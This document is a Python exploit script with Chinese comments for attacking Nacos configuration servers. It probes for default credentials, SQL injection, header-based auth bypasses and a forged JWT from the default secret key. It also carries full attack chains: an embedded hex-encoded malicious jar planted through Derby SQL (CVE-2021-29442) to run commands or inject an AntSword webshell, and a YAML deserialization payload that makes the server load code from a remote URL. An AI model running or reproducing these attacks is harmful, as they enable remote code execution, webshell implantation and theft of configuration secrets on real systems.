import random
import sys
import requests
import jwt
import time
import base64
from urllib.parse import urljoin
import argparse
import re
from urllib.parse import urljoin, urlencode, urlparse, parse_qs, urlunparse
import urllib.parse

'''
nacos密码bcrypt
hashcat -a 0 -m 3200 hashes.txt rockyou.txt -w 3 -O -D 1,2 --show

配置文件密文 jasypt
java -cp jasypt-1.9.3.jar org.jasypt.intf.cli.JasyptPBEStringEncryptionCLI input="123456" password="salt123" algorithm="PBEWithMD5AndDES"
java -cp jasypt-1.9.3.jar org.jasypt.intf.cli.JasyptPBEStringDecryptionCLI input="MecKdyPwwkD+AqUKPy1GlQ==" password="salt123" algorithm="PBEWithMD5AndDES"
'''
proxies = {
    # "http":"http://127.0.0.1:8083",
    # "https":"http://127.0.0.1:8083"
}

headers ={
    "Cookie": "BIDUPSID=0F33197772426E2FB6771A2DE0C095A6; PSTM=1728353643; BD_UPN=12314753; BAIDUID=300CD814A7405C9424A93CC7F20C1845:FG=1; H_WISE_SIDS_BFESS=60277; H_WISE_SIDS=60277_60854_60884_60875; ZFY=VpT3BYENRLwsXD14pX37J3ikuVGlraQI5P4P:AvHm4P4:C; BAIDUID_BFESS=300CD814A7405C9424A93CC7F20C1845:FG=1; BD_CK_SAM=1; PSINO=6; delPer=0; BA_HECTOR=a5802k812k0h8l0084a4a52g89kmg21jgviuo1v; BDORZ=FFFB88E999055A3F8A630C64834BD6D0; H_PS_PSSID=60277_60854_60884_60875_60897; BD_HOME=1",
    "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "Windows",
    "Upgrade-Insecure-Requests": "1",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "zh-CN,zh;q=0.9",
}

def leak_info(target):
    version_url = urljoin(target, '/nacos/v1/console/server/state')
    get_resp = requests.get(url=version_url, headers=headers, proxies=proxies)
    if "version" in get_resp.text:
        get_json = get_resp.json()
        print("[+] Target : "+ target +" (Nacos 版本信息: " + get_json.get("version") +")")

def default_pwd(target):
    login_url = urljoin(target, '/nacos/v1/auth/users/login')
    headers["Content-type"] = "application/x-www-form-urlencoded"
    post_data = "username=nacos&password=nacos"
    post_resp = requests.post(url=login_url, data=post_data, headers=headers, proxies=proxies)
    if "accessToken" in post_resp.text:
        print("[+] Target : "+ target +" (Nacos 弱口令: nacos/nacos)")

def CNVD_2020_67618(target):
    version_url = urljoin(target, '/nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20')
    get_resp = requests.get(url=version_url, headers=headers, proxies=proxies)
    if "USERNAME" in get_resp.text:
        print("[+] Target : "+ target +" Derby SQL注入(CNVD-2020-67618)")

def CVE_2021_29441(target):
    version_url = urljoin(target, '/nacos/v1/auth/users?pageNo=1&pageSize=9')
    headers['User-Agent'] = 'Nacos-Server'
    get_resp = requests.get(url=version_url, headers=headers, proxies=proxies)
    if "username" in get_resp.text:
        print("[+] Target : "+ target +" Nacos User-Agent 权限绕过 (CVE_2021_29441)")

def CVE_2021_29442(target, jarPath, shell, command):  
    removal_url = urljoin(target, '/nacos/v1/cs/ops/data/removal')
    derby_url = urljoin(target, '/nacos/v1/cs/ops/derby')
    antSword_jar = ''
    command_jar = '504b03040a000008000033b9f058000000000000000000000000090000004d4554412d494e462f504b030414000008080033b9f058fcfe28795000000051000000140000004d4554412d494e462f4d414e49464553542e4d46f34dcccb4c4b2d2ed10d4b2d2acecccfb35230d433e0e5722e4a4d2c494dd175aab452f04d2c4bcd53f0720c5208c8294dcfcc5330d63306a9712acdcc49d1f54ac9d60d2e484d066a34e4e5e2e50200504b03040a0000080000cfaaef5800000000000000000000000004000000636f6d2f504b03040a000008000097b0f0580000000000000000000000000c000000636f6d2f747267616e64612f504b03040a000008000033b9f0580000000000000000000000000f0000004d4554412d494e462f6d6176656e2f504b03040a000008000033b9f0580000000000000000000000001b0000004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f504b03040a000008000033b9f058000000000000000000000000230000004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f726567656f72672f504b030414000008080033b9f0589475fc2c7b040000720800000a000000457865632e636c6173738d555b535b5514fe4e48b20f87700b0448e90d6bdb700958b55a435b2d6d6ab1e162a060506b4f4e4ee04048e2c909975ab53ae38ce33ff0c5195fe4b5be848eccf8d8077f8ccf3e15bf7d02210c716c26b3f75e6b7dfb5b6bafb5d7d97fbdfce34f006fe37b0daf6352e0230d1e4caab8af22a1610ad32a6634dcc1ac8a8f3524312787790d713c1058d0d08a45814f34b423258725b9fd5381cf043ed7d02d191f6ae8c1171abaf0486a7429ea02690143c369e92b2367531ab37295951c598165811505feeb56de726e2a688a0c2e28f0de2e644c05ed092b6f4e97d7d3a63dafa773d404130543cf2de8b625e503a5d759b14ae448c4b74c639cb2c959c1a5486255dfd0c7727a7e796cceb1adfcf2f8e049950261ace876c974247d03b3bf509ad6d7e947292ae8aa43ccda05c32c950869caca0042559b55189bcc17cb0e094c7d5d5aad92ada0bf913569ea19d326c69326a4af06992867b3a66d666a766f8ea9602c9bb6e59884f6d4a0d538175dbd3c4c91a20b390a6756aa6a08c5acd9dc63c4b70cb3e85885bc0cd558cfc860b2b560ea72510d8aa8d6394737d6a6f4a25b00014b6055604d81365728db8679d792656996e5189524015cc425c6dc985081afec64a3d7187ba1349a67aa057201ac234acda295cf14364b01e4516078cbe9358162005fc20e6004d43b282b08ff676aa5eb8d43d727122bad9b016c613b80c7f88ae56d901605dd8d727d083e9e5fc9f82480aff14d00dfca43d7409333758cbd275361e53292d41f4f2667923119cfd300bec3366b1f77ef73c7d19e99f4aa6938c754551a059d27ee677d0c47e939be79bbe49854b52c9b0e77154ddba15fade4e8b6535ab41c7668a851372d1df3972ce71d4b368a469a9a108ad437dd819a97e8f2ffb4e75177b591ee58e4bd8794275a6d28d2d0d0c013bf325d47e0833e935a953b3209b7dbba230dbf177ebd5834f3ec939157fac2d4daa6cedf41334a7fed6ec3ba1d356feb06ddf6451a76ae04fb8c5ca14448f4153dbb978aae55a75055610017f806c89f078aec4b8e97298d715638fb8676a1fcee9a231cfdae52c520c7401580210c736e66ff45ab9b3d7e782903bfedc193da455322e89d0afa9ec33f1d7d81f6685054a0fe0c7fb079ea39b4a10a5a62deb0b78240ccb787d654d837b28bb6987f0feda9b07f171d31a1c4d4303775a662ea0bb40e87d50a828b3bfb7fefe0d6d41ebae92334bd879e547417bd31ef8824eb8b5610968b533bf049e2d3449d099eade01c2de7395530f06cb882d79ef16c2a1ec1e06bf5043fe047f4a3c93ded125f2da085d6568e6de8e46377161d4c5a90a7eec215be5e3710c23de2eea3170be823cf45329d42862c393e6c1b3843d673788af3e41ec04f4cf7af4cb3cce063e6b0050f30ca747bc83e8337b86a22f73be47e9359bc42f92dbed43efab980abd4fbe9ad0fefe21a047d86f01e112a3d5d450ce3dcbbc16a5c27dacb086ee026de27332b810f889395fb05b730c13adda6f410e22506043c0277f8df6750cdeef240211017b82bd02ad04e11d8e781ab36924e0874edf334bec32d5d02dd82a95004fa957fe4021fba37e7debf504b030414000008080058aaef5840b75f2d53010000eb0200002a0000004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f726567656f72672f706f6d2e786d6c8d91cd6ec2301084ef3c45947bec507a40c8b5d443ab56828204ad7a35f636982676643b84be7d6d879fe440d55b76f6db9df186d446ef81bbe45895ca3ea43be7ea19c6153b8042ac667c07489b02af960b7c8f7294a71d393b5a79a1dbb645ed247277793ec69f8bf9da0f562c93ca3aa638a4a324f113331be5b9e6cc49adfe6197dc228e5674621639e4eb947a17526901e50718eb0d68ec113cd046812a8c6eea5741b9ae9033055382117c1603c08c935f8c3b5f1a28c05b12dcd30272382d1ca33c5bbf3daed62fcb0dc16735103eee372ba42ae89e1982af65cca05805d7e5b10a72634a7ae3d50487661cf6ffad069f076c18ea84f023d1b691a540563786c393e25a04bff7cd7336f501fe62c256dc5f1b04013528018a5f8d2ed24f27f4aeb96f9474833bc676ef6e276278c9089def364153341e9c31b62df7c1a803eba7bbef2e0d1ec6e9d531f1e5cd74f40b504b0304140000080800ca82f0586a0b6b6f3c0000003c000000310000004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f726567656f72672f706f6d2e70726f706572746965734b2c2ac94c4b4c2ef14cb12d4a4d4fcd2f4ae74a2fca2f2d00f293f373f54a8ad213f35212b9ca528b8a33f3f36c0df50c7483fd1c03823dfc43b800504b010214030a000008000033b9f058000000000000000000000000090000000000000000001000ed41000000004d4554412d494e462f504b0102140314000008080033b9f058fcfe28795000000051000000140000000000000000000000a481270000004d4554412d494e462f4d414e49464553542e4d46504b010214030a0000080000cfaaef58000000000000000000000000040000000000000000001000ed41a9000000636f6d2f504b010214030a000008000097b0f0580000000000000000000000000c0000000000000000001000ed41cb000000636f6d2f747267616e64612f504b010214030a000008000033b9f0580000000000000000000000000f0000000000000000001000ed41f50000004d4554412d494e462f6d6176656e2f504b010214030a000008000033b9f0580000000000000000000000001b0000000000000000001000ed41220100004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f504b010214030a000008000033b9f058000000000000000000000000230000000000000000001000ed415b0100004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f726567656f72672f504b0102140314000008080033b9f0589475fc2c7b040000720800000a0000000000000000000000a4819c010000457865632e636c617373504b0102140314000008080058aaef5840b75f2d53010000eb0200002a0000000000000000000000a4813f0600004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f726567656f72672f706f6d2e786d6c504b01021403140000080800ca82f0586a0b6b6f3c0000003c000000310000000000000000000000a481da0700004d4554412d494e462f6d6176656e2f636f6d2e747267616e64612f726567656f72672f706f6d2e70726f70657274696573504b0506000000000a000a00ab020000650800000000'
    headers.pop("Content-type", None) 
    headers["User-Agent"] = "Nacos-Server"

    if shell == 'AntSword内存马':
        hex_jar = antSword_jar
        exec_method = 'TomcatMemoryShell.ConfigurationUtil.exec'
        print("[*] 请注入shell访问地址是 http://127.0.0.1:8848/nacos/xxx nacos路径下任意路径")
    else:
        hex_jar = command_jar
        exec_method = 'Exec.exec'

    for i in range(0, sys.maxsize):
        id = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 8))
        post_sql = f"""
CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('values cast(X''{hex_jar}'' as blob)', '{jarPath}{id}', ',', '"', 'UTF-8', '{jarPath}{id}.jar')
CALL sqlj.install_jar('{jarPath}{id}.jar', 'NACOS.{id}', 0)
CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'NACOS.{id}')
CREATE FUNCTION S_EXAMPLE_{id}( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME '{exec_method}'
"""
        get_sql = f"SELECT * FROM (SELECT COUNT(*) AS b, S_EXAMPLE_{id}('{command}') AS a FROM config_info) tmp"
        files = {'file': post_sql}
        post_resp = requests.post(url=removal_url, files=files, headers=headers, proxies=proxies)
        post_json = post_resp.json()
        if command is None and shell is None and post_json.get('data', None) is None:
            if ":\\" in post_resp.text:
                print("[*] 目标系统是 windows")
            else:
                print("[*] 目标系统是 linux")
            print("[+] Target : "+ target +" removal 接口存在 (CVE-2021-29442), 请输入具体命令进行利用")
            return


        if post_json.get('message', None) is None and post_json.get('data', None) is not None:
            print(post_resp.text)
            get_resp = requests.get(url=derby_url, params={'sql': get_sql}, headers=headers, proxies=proxies)
            print(get_resp.text)
            break

def QVD_2023_6271(target):
    payload = {
    "sub": "nacos",
    "exp": int(time.time()) + 86400
    }
    key = "SecretKey012345678901234567890123456789012345678901234567890123456789"
    
    valid_key = re.sub('[^A-Za-z0-9+/]', '', key)
    decoded_string = base64.b64decode(valid_key[:len(valid_key)-(len(valid_key)%4)])
    encoded_jwt = jwt.encode(payload, decoded_string, algorithm="HS256")

    login_url = urljoin(target,"/nacos/v1/auth/users/login")
    headers["Content-type"] = "application/x-www-form-urlencoded"
    headers["Authorization"] = "Bearer " + encoded_jwt
    post_data = 'username=1&password=9'
    post_resp = requests.post(url=login_url, data=post_data, headers=headers, proxies=proxies)
    if "accessToken" in post_resp.text:
        print("[+] Target : "+ target +" Nacos JWT身份绕过漏洞 (QVD-2023-6271)")
        print("[+] JWT :  " + encoded_jwt)


def Nacos_ServerIdentity(target):
    version_url = urljoin(target, '/nacos/v1/auth/users?pageNo=1&pageSize=9')
    headers['serverIdentity'] = 'security'
    get_resp = requests.get(url=version_url, headers=headers, proxies=proxies)
    if "username" in get_resp.text:
        print("[+] Target : "+ target +" Nacos User-Agent serverIdentity 权限绕过")

def CNVD_2023_45001(target):
    print("Hessian 反序列化 CNVD-2023-45001 正在开发")

def Nacos_Client_Yaml反序列化(target,dataID,group,accessToken,payload_uri):
    config_url = urljoin(target, '/nacos/v1/cs/configs?show=all&dataId='+dataID+'&group='+group+'&accessToken='+accessToken)
    get_resp = requests.get(url=config_url, headers=headers, proxies=proxies)
    if "dataId" in get_resp.text and get_resp.status_code == 200:
        get_json = get_resp.json()
    

    payload_url = urljoin(target, '/nacos/v1/cs/configs?accessToken='+accessToken)
    post_data = 'dataId='+dataID+'&group='+group+'&content=%21%21javax.script.ScriptEngineManager+%5B%0A++%21%21java.net.URLClassLoader+%5B%5B%0A++++%21%21java.net.URL+%5B%22'+urllib.parse.quote(payload_uri, safe='')+'%22%5D%0A++%5D%5D%0A%5D&appName=&desc=&type=yaml&id=&md5=&tenant=&createTime=&modifyTime=&createUser=&createIp=&use=&effect=&schema=&configTags='
    headers["Content-type"] = "application/x-www-form-urlencoded"
    post_resp = requests.post(url=payload_url, data=post_data, headers=headers, proxies=proxies)
    if "true" in post_resp.text and post_resp.status_code == 200:
        print("[*] config 修改成功, 请注意payload是否有访问")
        time.sleep(2)
    
    for i in range(0,2):
        post_data = '&'.join([f'{key}={"null" if value is None else urllib.parse.quote(value) if key == "content" else value}' for key, value in get_json.items()])
        post_resp = requests.post(url=payload_url, data=post_data, headers=headers, proxies=proxies)
        if "true" in post_resp.text and i != 1:
            print("[*] config 已经恢复")
    
    headers.pop("Content-type", None) 



def unauth_download_config(target):
    # 也可以在url后面加上accessToken进行下载
    download_url = urljoin(target, '/nacos/v1/cs/configs?export=true&group=&tenant=&appName=&ids=&dataId=')
    headers['serverIdentity'] = 'security'
    get_resp = requests.get(url=download_url, headers=headers, proxies=proxies)
    if get_resp.text.startswith('PK') and get_resp.status_code == 200:
        print("[+] Target : "+ target +" Nacos未授权下载配置信息")

def main():
    parser = argparse.ArgumentParser(description='Exploit script for Nacos CVE-2021-29442')
    parser.add_argument('-t', '--target', required=True,  help='目标URl')
    parser.add_argument('-c', '--command',  help='执行的命令, 如果要注入shell无需该参数(CVE_2021_29442)')
    parser.add_argument('-shell', '--shell',  help='注入的shell类型,支持参数 AntSword内存马 (CVE_2021_29442)')
    parser.add_argument('-jp', '--jarPath', default="/tmp/", help='落地jar目录,默认linux目录/tmp/,如果是windows可以指定C:\\windows\\temp\\或其他可写入路径(CVE_2021_29442)')
    parser.add_argument('-id', '--DataID',  help='Nacos_Client_Yaml反序列化 所需配置文件的 Data ID')
    parser.add_argument('-g', '--Group',  help='Nacos_Client_Yaml反序列化 所需配置文件的 Group')
    parser.add_argument('-at', '--accessToken',  help='Nacos_Client_Yaml反序列化 所需有效后台凭证')
    parser.add_argument('-p', '--payloaduri',  help='Nacos_Client_Yaml反序列化 所需远程加载的jar包路径')
    parser.add_argument('-v', '--vul', required=True, help='单项选择漏洞(ALL,leak_info,default_pwd,CNVD_2020_67618,CVE_2021_29441,CVE_2021_29442,QVD_2023_6271,Nacos_ServerIdentity,CNVD_2023_45001,Nacos_Client_Yaml反序列化,unauth_download_config)')
    
    args = parser.parse_args()
        
    if args.vul == "ALL":
        print("[!] Nacos_Client_Yaml反序列化 需要手动利用")
        leak_info(args.target)
        default_pwd(args.target)
        CNVD_2020_67618(args.target)
        CVE_2021_29441(args.target)
        CVE_2021_29442(args.target, args.jarPath, args.shell, args.command)
        QVD_2023_6271(args.target)
        Nacos_ServerIdentity(args.target)
        CNVD_2023_45001(args.target)
        unauth_download_config(args.target)

    elif args.vul == "leak_info":
        leak_info(args.target)
    elif args.vul == "default_pwd":
        default_pwd(args.target)
    elif args.vul == "CNVD_2020_67618":
        CNVD_2020_67618(args.target)
    elif args.vul == "CVE_2021_29441":
        CVE_2021_29441(args.target)
    elif args.vul == "CVE_2021_29442":
        CVE_2021_29442(args.target, args.jarPath, args.shell, args.command)
    elif args.vul == "QVD_2023_6271":
        QVD_2023_6271(args.target)
    elif args.vul == "Nacos_ServerIdentity":
        Nacos_ServerIdentity(args.target)
    elif args.vul == "CNVD_2023_45001":
        CNVD_2023_45001(args.target)
    elif args.vul == "Nacos_Client_Yaml反序列化":
        if args.DataID is None and args.Group is None and args.accessToken is None and args.payloaduri is None:
            return print("[-] Nacos_Client_Yaml反序列化 参数不足")
        Nacos_Client_Yaml反序列化(args.target, args.DataID, args.Group, args.accessToken, args.payloaduri)
    elif args.vul == "unauth_download_config":
        unauth_download_config(args.target)

if __name__ == '__main__':
    main()

    

